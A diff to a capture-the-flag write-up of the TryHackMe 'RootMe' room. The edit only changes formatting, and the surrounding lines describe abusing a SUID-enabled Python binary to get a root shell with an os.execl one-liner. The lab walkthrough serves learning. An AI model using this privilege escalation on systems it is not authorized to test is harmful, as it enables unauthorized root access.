@@ -23,7 +23,7 @@ Now that we have gotten onto the computer we can start with the privilege escala
 
 ![priv_esc1](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/priv_esc.png)
 
-As we can see /usr/bin/python has the SUID bit set, we can use this to escalate our privileges with the command ```/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
+As we can see ```/usr/bin/python``` has the SUID bit set, we can use this to escalate our privileges with the command ```/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
 
 ![priv_esc2](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/priv_esc2.png)
 
